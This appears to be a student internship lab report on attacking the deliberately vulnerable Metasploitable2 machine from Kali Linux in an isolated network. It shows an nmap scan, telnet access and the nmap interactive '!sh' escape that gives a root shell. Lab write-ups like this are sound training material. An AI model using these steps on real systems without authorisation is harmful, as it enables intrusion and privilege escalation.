#  Cybersecurity Lab Report  
## APEX PLANET Internship – Task 01  
### Build a Hacking Lab & Perform Exploitation  

##  Objective  
To design and implement a controlled penetration testing lab environment and perform vulnerability assessment, exploitation, and privilege escalation on a vulnerable system.

## Lab Setup  

###  Attacker Machine  
- **Operating System:** Kali Linux  
- **Platform:** UTM Virtual Machine  

###  Target Machine  
- **System:** Metasploitable2  
- **Purpose:** Intentionally vulnerable Linux system  

###  Network Configuration  
- **Network Type:** Host-Only  
- **Kali Linux IP:** `192.168.128.X`  
- **Target IP:** `192.168.128.3`  


##  Phase 1: Reconnaissance & Scanning  

###  Command Used  
```bash
nmap -A 192.168.128.3
```

## Key Findings
- Multiple open ports identified
- Services detected:
     - FTP (vsftpd 2.3.4)
     - Telnet
     - SMB (Samba 3.0.20)
     - HTTP (Apache 2.2.8)

##  Phase 2: Exploitation (Initial Access)
```bash
telnet 192.168.128.3
```

##  Phase 3: Privilege Escalation

```bash
nmap --interactive
!sh
```

##  Result

```bash
whoami
root
```

##  Final Outcome

✔ Successfully compromised the system
✔ Achieved root-level access
✔ Demonstrated complete attack lifecycle


## Key Learnings

- Importance of network scanning and enumeration
- Risks of weak/default credentials
- Understanding real-world exploitation workflows
- Hands-on experience with privilege escalation techniques
- Difference between automated and manual exploitation














